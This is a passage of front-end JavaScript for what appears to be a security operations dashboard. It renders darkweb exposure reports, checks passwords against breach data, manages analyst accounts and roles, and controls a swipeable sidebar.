            <i data-lucide="${isClean ? 'shield-check' : 'alert-triangle'}" class="w-4 h-4 flex-shrink-0"></i>
            <span>${escapeHtml(data.status_note)}</span>
          </div>
        ` : ''}

        <!-- 4 SUMMARY TILES -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
          <div class="p-3 rounded-xl bg-[#060a14] border border-cyber-border">
            <div class="text-[10px] text-slate-500 uppercase">Ransomware Claims</div>
            <div class="text-lg font-bold ${data.summary.ransomware_cartel_claims > 0 ? 'text-red-400' : 'text-emerald-400'}">
              ${data.summary.ransomware_cartel_claims} Leaks
            </div>
            <div class="text-[10px] text-slate-400">${data.summary.ransomware_cartel_claims > 0 ? 'Active Tor leak posts' : 'Clean on Tor blogs'}</div>
          </div>
          <div class="p-3 rounded-xl bg-[#060a14] border border-cyber-border">
            <div class="text-[10px] text-slate-500 uppercase">Stealer Malware Logs</div>
            <div class="text-lg font-bold ${data.summary.stealer_logs_detected > 0 ? 'text-amber-300' : 'text-emerald-400'}">${data.summary.stealer_logs_detected} Logs</div>
            <div class="text-[10px] text-slate-400">${data.summary.stealer_logs_detected > 0 ? 'Lumma, RedLine, Vidar' : 'No stealer logs'}</div>
          </div>
          <div class="p-3 rounded-xl bg-[#060a14] border border-cyber-border">
            <div class="text-[10px] text-slate-500 uppercase">Compromised Accounts</div>
            <div class="text-lg font-bold ${data.summary.compromised_employee_accounts > 0 ? 'text-purple-400' : 'text-emerald-400'}">${data.summary.compromised_employee_accounts} Users</div>
            <div class="text-[10px] text-slate-400">${data.summary.compromised_employee_accounts > 0 ? 'Discovered employee credentials' : 'No leaked users'}</div>
          </div>
          <div class="p-3 rounded-xl bg-[#060a14] border border-cyber-border">
            <div class="text-[10px] text-slate-500 uppercase">Darkweb IAB Listings</div>
            <div class="text-lg font-bold ${data.summary.active_iab_listings > 0 ? 'text-cyan-300' : 'text-emerald-400'}">${data.summary.active_iab_listings} Listings</div>
            <div class="text-[10px] text-slate-400">${data.summary.active_iab_listings > 0 ? 'Initial Access Broker listings' : 'No broker listings'}</div>
          </div>
        </div>
      </div>

      <!-- SECTION: RANSOMWARE EXPOSURES (IF ANY) -->
      ${data.ransomware_exposures && data.ransomware_exposures.length > 0 ? `
        <div class="rounded-2xl border border-red-500/40 bg-red-950/20 p-5 space-y-3">
          <h4 class="font-bold text-red-300 flex items-center gap-2 text-sm">
            <i data-lucide="skull" class="w-4 h-4 text-red-400"></i> Active Tor Ransomware Disclosures Found
          </h4>
          <div class="space-y-2">
            ${data.ransomware_exposures.map(r => `
              <div class="p-3 rounded-xl bg-[#060a14]/80 border border-red-500/30 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
                <div class="space-y-1">
                  <div class="flex items-center gap-2">
                    <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30 font-bold text-[10px]">${escapeHtml(r.cartel)}</span>
                    <span class="font-bold text-white">${escapeHtml(r.victim_name)}</span>
                    <span class="text-[10px] text-slate-400">(${escapeHtml(r.country)})</span>
                  </div>
                  <div class="text-[11px] text-slate-300">${escapeHtml(r.claimed_leak_data)}</div>
                </div>
                ${r.onion_leak_url ? `
                  <button onclick="pivotDarkwebIocToTriage('${escapeHtml(r.onion_leak_url)}')" class="px-3 py-1.5 rounded-lg bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 text-[11px] font-bold hover:bg-cyber-cyan/25 transition whitespace-nowrap">
                    Investigate Onion
                  </button>
                ` : ''}
              </div>
            `).join('')}
          </div>
        </div>
      ` : `
        <div class="rounded-2xl border border-emerald-500/30 bg-emerald-500/5 p-4 flex items-center gap-3 text-xs">
          <i data-lucide="shield-check" class="w-5 h-5 text-emerald-400 flex-shrink-0"></i>
          <div>
            <span class="font-bold text-emerald-400">No Direct Ransomware Blog Staging:</span>
            <span class="text-slate-300"> No published extortion posts or countdown timers detected for this domain on top Tor leak sites.</span>
          </div>
        </div>
      `}

      <!-- SECTION: COMPROMISED EMPLOYEE CREDENTIALS -->
      <div class="rounded-2xl border border-cyber-border bg-cyber-card p-5 space-y-3 text-xs">
        <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
          <h4 class="font-bold text-amber-300 flex items-center gap-2">
            <i data-lucide="user-x" class="w-4 h-4 text-amber-400"></i> Infostealer Malware Logs & Compromised Credentials
          </h4>
          <span class="text-[11px] text-slate-400">Masked for privacy</span>
        </div>

        ${data.compromised_accounts && data.compromised_accounts.length > 0 ? `
          <div class="overflow-x-auto">
            <table class="w-full text-left border-collapse text-xs">
              <thead>
                <tr class="border-b border-cyber-border text-[10px] text-slate-500 uppercase bg-white/5">
                  <th class="py-2.5 px-3">Compromised Account</th>
                  <th class="py-2.5 px-3">Stealer Malware</th>
                  <th class="py-2.5 px-3">Exfiltrated Target Service</th>
                  <th class="py-2.5 px-3">Cookie / MFA Status</th>
                  <th class="py-2.5 px-3 text-right">Risk Level</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-cyber-border/60 text-[11px]">
                ${data.compromised_accounts.map(acc => `
                  <tr class="hover:bg-white/5 transition">
                    <td class="py-2.5 px-3 font-mono font-bold text-white">${escapeHtml(acc.account)}</td>
                    <td class="py-2.5 px-3 text-purple-300 font-semibold">${escapeHtml(acc.stealer_family)}</td>
                    <td class="py-2.5 px-3 text-slate-300 truncate max-w-[200px]" title="${escapeHtml(acc.target_service)}">${escapeHtml(acc.target_service)}</td>
                    <td class="py-2.5 px-3">
                      <span class="px-2 py-0.5 rounded text-[10px] font-bold ${acc.cookie_session_hijack.includes('Bypass') ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-slate-800 text-slate-400'}">
                        ${escapeHtml(acc.cookie_session_hijack)}
                      </span>
                    </td>
                    <td class="py-2.5 px-3 text-right font-bold ${acc.risk === 'CRITICAL' ? 'text-red-400' : 'text-amber-400'}">
                      ${escapeHtml(acc.risk)}
                    </td>
                  </tr>
                `).join('')}
              </tbody>
            </table>
          </div>
        ` : `
          <div class="p-4 rounded-xl bg-white/5 border border-cyber-border text-center text-slate-400 text-xs flex items-center justify-center gap-2">
            <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i> No confirmed leaked credentials or stealer logs discovered in active darkweb feeds.
          </div>
        ` }
      </div>

      <!-- SECTION: EXPOSED CORPORATE PORTALS -->
      <div class="rounded-2xl border border-cyber-border bg-cyber-card p-5 space-y-3 text-xs">
        <h4 class="font-bold text-white flex items-center gap-2">
          <i data-lucide="server" class="w-4 h-4 text-cyber-cyan"></i> Perimeter Login Endpoints Found in Stealer Telemetry
        </h4>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
          ${data.exposed_portals.map(p => `
            <div class="p-3 rounded-xl bg-[#060a14] border border-cyber-border flex items-center justify-between text-xs">
              <div>
                <div class="font-bold text-slate-200">${escapeHtml(p.service)}</div>
                <div class="text-[11px] text-cyber-cyan font-mono truncate max-w-[240px]">${escapeHtml(p.url)}</div>
              </div>
              <span class="px-2 py-0.5 rounded text-[10px] font-bold ${p.risk === 'CRITICAL' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-amber-500/20 text-amber-300 border border-amber-500/30'}">
                ${escapeHtml(p.risk)}
              </span>
            </div>
          `).join('')}
        </div>
      </div>

      <!-- SECTION: SOC MITIGATION PLAYBOOK -->
      <div class="rounded-2xl border border-cyber-cyan/30 bg-[#090e1c] p-5 space-y-3 text-xs">
        <h4 class="font-bold text-cyber-cyan flex items-center gap-2">
          <i data-lucide="shield-alert" class="w-4 h-4"></i> Recommended SOC Containment & Incident Response Actions
        </h4>
        <ul class="space-y-2 text-slate-300 text-[11px]">
          ${data.mitigation_playbook.map(step => `
            <li class="flex items-start gap-2">
              <span class="w-1.5 h-1.5 rounded-full bg-cyber-cyan mt-1.5 flex-shrink-0"></span>
              <span>${escapeHtml(step)}</span>
            </li>
          `).join('')}
        </ul>
      </div>
    `;

  } catch (err) {
    container.innerHTML = `
      <div class="p-6 rounded-2xl border border-red-500/30 bg-red-500/10 text-red-300 text-xs">
        Error communicating with darkweb surveillance engine: ${escapeHtml(err.message)}
      </div>
    `;
  } finally {
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = `<i data-lucide="scan" class="w-4 h-4"></i> <span>Analyze Domain Exposure</span>`;
      if (window.lucide) window.lucide.createIcons();
    }
  }
}

async function checkPasswordPwned(event) {
  if (event) event.preventDefault();
  const input = document.getElementById('dw-pwned-pwd-input');
  const resultBox = document.getElementById('dw-pwned-result');
  const password = (input?.value || '').trim();

  if (!password) return;

  resultBox.classList.remove('hidden');
  resultBox.innerHTML = `
    <div class="p-3 rounded-xl bg-white/5 border border-cyber-border text-slate-400 text-xs flex items-center gap-2">
      <span class="animate-spin inline-block w-3.5 h-3.5 border-2 border-current border-t-transparent rounded-full"></span>
      Checking SHA-1 k-anonymity registry against 900M+ real-world breach dumps...
    </div>
  `;

  try {
    const resp = await fetch('/api/darkweb/password-pwned', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password })
    });

    const data = await resp.json();

    if (data.pwned) {
      resultBox.innerHTML = `
        <div class="p-4 rounded-xl bg-red-500/15 border border-red-500/40 text-xs space-y-2 font-mono">
          <div class="flex items-center gap-2 text-red-400 font-bold text-sm">
            <i data-lucide="alert-octagon" class="w-4 h-4"></i>
            COMPROMISED PASSWORD DETECTED!
          </div>
          <div class="text-slate-200">
            This password was found in <span class="font-bold text-red-300 text-sm">${data.count.toLocaleString()}</span> known public breaches and combolists.
          </div>
          <div class="text-[11px] text-slate-400">
            SHA-1 Prefix verified: <code class="text-cyber-cyan">${escapeHtml(data.hash_prefix)}...</code> · Source: ${escapeHtml(data.source)}
          </div>
          <div class="text-[11px] text-amber-300 font-bold">
            Recommendation: Ban this password immediately across Active Directory, Okta, and Azure AD password protection filters.
          </div>
        </div>
      `;
    } else {
      resultBox.innerHTML = `
        <div class="p-4 rounded-xl bg-emerald-500/15 border border-emerald-500/40 text-xs space-y-1 font-mono">
          <div class="flex items-center gap-2 text-emerald-400 font-bold">
            <i data-lucide="check-circle" class="w-4 h-4"></i>
            NO DIRECT BREACH OCCURRENCES FOUND
          </div>
          <div class="text-slate-300 text-[11px]">
            Password not detected in known HIBP combolists. SHA-1 hash prefix: <code class="text-cyber-cyan">${escapeHtml(data.hash_prefix)}...</code>
          </div>
        </div>
      `;
    }
    if (window.lucide) window.lucide.createIcons();
  } catch (err) {
    resultBox.innerHTML = `
      <div class="p-3 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400 text-xs">
        Failed to check password: ${escapeHtml(err.message)}
      </div>
    `;
  }
}


// ==============================================================================
// USER MANAGEMENT & ACCESS CONTROL
// ==============================================================================

async function loadUserManagementData() {
  const tbody = document.getElementById('settings-users-tbody');
  if (!tbody) return;
  tbody.innerHTML = `<tr><td colspan="6" class="py-4 text-center text-slate-500 font-mono text-xs">Loading analyst directory...</td></tr>`;

  try {
    const token = sessionStorage.getItem('lazysoc_auth_token') || '';
    const headers = {};
    if (token) headers['Authorization'] = `Bearer ${token}`;

    const resp = await fetch('/api/users', { headers });
    if (!resp.ok) {
      throw new Error(`Failed to load users (HTTP ${resp.status})`);
    }
    const data = await resp.json();
    const users = data.users || [];

    if (users.length === 0) {
      tbody.innerHTML = `<tr><td colspan="6" class="py-4 text-center text-slate-500 text-xs">No analyst accounts found.</td></tr>`;
      return;
    }

    const roleBadges = {
      'SOC Lead / Admin': 'bg-amber-500/15 text-amber-300 border-amber-500/30',
      'Tier-2 SOC': 'bg-cyber-cyan/15 text-cyber-cyan border-cyber-cyan/30',
      'Tier-1 Analyst': 'bg-blue-500/15 text-blue-300 border-blue-500/30'
    };

    tbody.innerHTML = users.map(u => {
      const isRootAdmin = u.username === 'admin';
      const badgeCls = roleBadges[u.role] || 'bg-slate-500/15 text-slate-300 border-slate-500/30';
      return `
        <tr class="hover:bg-white/5 transition">
          <td class="py-2.5 px-3 font-bold text-white flex items-center gap-2">
            <span class="w-2 h-2 rounded-full ${u.is_active ? 'bg-emerald-400' : 'bg-red-400'}"></span>
            ${escapeHtml(u.username)}
          </td>
          <td class="py-2.5 px-3 text-slate-300">${escapeHtml(u.full_name || '-')}</td>
          <td class="py-2.5 px-3">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${badgeCls}">
              ${escapeHtml(u.role)}
            </span>
          </td>
          <td class="py-2.5 px-3 text-slate-400 text-[10px] whitespace-nowrap">${escapeHtml(u.created_at || '-')}</td>
          <td class="py-2.5 px-3 text-slate-400 text-[10px] whitespace-nowrap">${escapeHtml(u.last_login || 'Never')}</td>
          <td class="py-2.5 px-3 text-right">
            <div class="inline-flex items-center gap-1.5">
              <button onclick="updateUserPasswordFromSettings('${escapeHtml(u.username)}')" title="Reset Password" class="px-2 py-1 rounded bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border text-[10px] transition">
                Reset PW
              </button>
              <button onclick="updateUserRoleFromSettings('${escapeHtml(u.username)}', '${escapeHtml(u.role)}')" title="Change Role" class="px-2 py-1 rounded bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border text-[10px] transition">
                Role
              </button>
              ${isRootAdmin ? '' : `
                <button onclick="deleteUserFromSettings('${escapeHtml(u.username)}')" title="Delete Account" class="px-2 py-1 rounded bg-red-500/15 hover:bg-red-500/25 text-red-300 border border-red-500/30 text-[10px] transition">
                  Delete
                </button>
              `}
            </div>
          </td>
        </tr>
      `;
    }).join('');

    if (window.lucide) window.lucide.createIcons();
  } catch (err) {
    tbody.innerHTML = `<tr><td colspan="6" class="py-4 text-center text-red-400 text-xs">${escapeHtml(err.message)}</td></tr>`;
  }
}

async function createUserFromSettings(e) {
  if (e && e.preventDefault) e.preventDefault();
  const usernameInput = document.getElementById('new-user-username');
  const fullnameInput = document.getElementById('new-user-fullname');
  const roleInput = document.getElementById('new-user-role');
  const passwordInput = document.getElementById('new-user-password');

  const username = usernameInput?.value.trim() || '';
  const fullName = fullnameInput?.value.trim() || '';
  const role = roleInput?.value || 'Tier-2 SOC';
  const password = passwordInput?.value || '';

  if (!username || !password) {
    alert('Username and password are required.');
    return;
  }

  try {
    const token = sessionStorage.getItem('lazysoc_auth_token') || '';
    const headers = { 'Content-Type': 'application/json' };
    if (token) headers['Authorization'] = `Bearer ${token}`;

    const resp = await fetch('/api/users', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        username,
        full_name: fullName || username,
        role,
        password
      })
    });
    const data = await resp.json();
    if (resp.ok && data.success) {
      alert(`Analyst account '${username}' created successfully!`);
      if (usernameInput) usernameInput.value = '';
      if (fullnameInput) fullnameInput.value = '';
      if (passwordInput) passwordInput.value = '';
      loadUserManagementData();
    } else {
      alert('Error creating user: ' + (data.detail || data.message || 'Unknown error'));
    }
  } catch (err) {
    alert('Network error creating user: ' + err.message);
  }
}

async function deleteUserFromSettings(username) {
  if (!confirm(`Are you sure you want to permanently delete analyst account '${username}'?`)) {
    return;
  }

  try {
    const token = sessionStorage.getItem('lazysoc_auth_token') || '';
    const headers = {};
    if (token) headers['Authorization'] = `Bearer ${token}`;

    const resp = await fetch(`/api/users/${encodeURIComponent(username)}`, {
      method: 'DELETE',
      headers
    });
    const data = await resp.json();
    if (resp.ok && data.success) {
      alert(`Analyst account '${username}' deleted successfully.`);
      loadUserManagementData();
    } else {
      alert('Failed to delete account: ' + (data.detail || data.message || 'Operation denied'));
    }
  } catch (err) {
    alert('Error deleting user: ' + err.message);
  }
}

async function updateUserPasswordFromSettings(username) {
  const newPassword = prompt(`Enter new password for analyst '${username}' (min 6 characters):`);
  if (!newPassword) return;
  if (newPassword.length < 6) {
    alert('Password must be at least 6 characters long.');
    return;
  }

  try {
    const token = sessionStorage.getItem('lazysoc_auth_token') || '';
    const headers = { 'Content-Type': 'application/json' };
    if (token) headers['Authorization'] = `Bearer ${token}`;

    const resp = await fetch(`/api/users/${encodeURIComponent(username)}/password`, {
      method: 'PUT',
      headers,
      body: JSON.stringify({ password: newPassword })
    });
    const data = await resp.json();
    if (resp.ok && data.success) {
      alert(`Password for '${username}' updated successfully.`);
    } else {
      alert('Failed to update password: ' + (data.detail || data.message || 'Error'));
    }
  } catch (err) {
    alert('Network error updating password: ' + err.message);
  }
}

async function updateUserRoleFromSettings(username, currentRole) {
  const roles = ['Tier-1 Analyst', 'Tier-2 SOC', 'SOC Lead / Admin'];
  const newRole = prompt(`Update SOC role for '${username}':\nOptions: ${roles.join(', ')}`, currentRole);
  if (!newRole || newRole === currentRole) return;
  if (!roles.includes(newRole)) {
    alert(`Invalid role. Must be one of:\n${roles.join('\n')}`);
    return;
  }

  try {
    const token = sessionStorage.getItem('lazysoc_auth_token') || '';
    const headers = { 'Content-Type': 'application/json' };
    if (token) headers['Authorization'] = `Bearer ${token}`;

    const resp = await fetch(`/api/users/${encodeURIComponent(username)}/role`, {
      method: 'PUT',
      headers,
      body: JSON.stringify({ role: newRole })
    });
    const data = await resp.json();
    if (resp.ok && data.success) {
      alert(`Role for '${username}' updated to '${newRole}'.`);
      loadUserManagementData();
    } else {
      alert('Failed to update role: ' + (data.detail || data.message || 'Error'));
    }
  } catch (err) {
    alert('Network error updating role: ' + err.message);
  }
}


// =========================================================================
// SLIDEABLE SIDEBAR & SWIPE/DRAG CONTROLLER (NO BUTTON CLICK NEEDED)
// =========================================================================
function initSlideableSidebar() {
  const sidebar = document.getElementById('app-sidebar');
  if (!sidebar) return;

  let startX = 0;
  let startY = 0;
  let isTracking = false;

  // Touch Swipe Gesture (Mobile / Tablet / Touchscreen)
  window.addEventListener('touchstart', (e) => {
    if (!e.touches || e.touches.length === 0) return;
    startX = e.touches[0].clientX;
    startY = e.touches[0].clientY;
    // Track if started near left edge (< 45px) or inside sidebar
    if (startX < 45 || e.target.closest('#app-sidebar')) {
      isTracking = true;
    }
  }, { passive: true });

  window.addEventListener('touchend', (e) => {
    if (!isTracking || !e.changedTouches || e.changedTouches.length === 0) return;
    const endX = e.changedTouches[0].clientX;
    const endY = e.changedTouches[0].clientY;
    const deltaX = endX - startX;
    const deltaY = Math.abs(endY - startY);

    // Horizontal swipe threshold (ignore vertical scrolling)
    if (deltaY < 75 && Math.abs(deltaX) > 40) {
      if (deltaX > 40) {
        // Swiped Right -> Slide open
        if (window.innerWidth < 1024) {
          if (typeof toggleSidebar === 'function') toggleSidebar(true);
        } else {
          sidebar.classList.remove('sidebar-collapsed');
          localStorage.setItem('lazysoc_sidebar_collapsed', '0');
          syncSidebarIcons(false);
        }
      } else if (deltaX < -40) {
        // Swiped Left -> Slide close
        if (window.innerWidth < 1024) {
          if (typeof toggleSidebar === 'function') toggleSidebar(false);
        } else {
          sidebar.classList.add('sidebar-collapsed');
          localStorage.setItem('lazysoc_sidebar_collapsed', '1');
          syncSidebarIcons(true);
        }
      }
    }
    isTracking = false;
  }, { passive: true });

  // Mouse Drag on Sidebar Slide Handle
  const handle = document.getElementById('sidebar-slide-handle');
  if (handle) {
    let mouseStartX = 0;
    let isMouseDown = false;

    handle.addEventListener('mousedown', (e) => {
      mouseStartX = e.clientX;
      isMouseDown = true;
      e.preventDefault();
    });

    window.addEventListener('mousemove', (e) => {
      if (!isMouseDown) return;
      const delta = e.clientX - mouseStartX;
      if (delta > 25) {
        sidebar.classList.remove('sidebar-collapsed');
        localStorage.setItem('lazysoc_sidebar_collapsed', '0');
        syncSidebarIcons(false);
        isMouseDown = false;
      } else if (delta < -25) {
        sidebar.classList.add('sidebar-collapsed');
        localStorage.setItem('lazysoc_sidebar_collapsed', '1');
        syncSidebarIcons(true);
        isMouseDown = false;
      }
    });

    window.addEventListener('mouseup', () => {
      isMouseDown = false;
    });

    handle.addEventListener('click', (e) => {
      e.stopPropagation();
      if (typeof toggleSidebarMinimize === 'function') {
        toggleSidebarMinimize();
      }
    });
  }
}

function syncSidebarIcons(isCollapsed) {
  const icon = document.getElementById('sidebar-toggle-icon');
  if (icon) icon.setAttribute('data-lucide', isCollapsed ? 'panel-left-open' : 'panel-left-close');
  const slideIcon = document.getElementById('sidebar-slide-icon');
  if (slideIcon) slideIcon.setAttribute('data-lucide', isCollapsed ? 'chevrons-right' : 'chevrons-left');
  if (window.lucide) window.lucide.createIcons();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initSlideableSidebar);
} else {
  initSlideableSidebar();
}
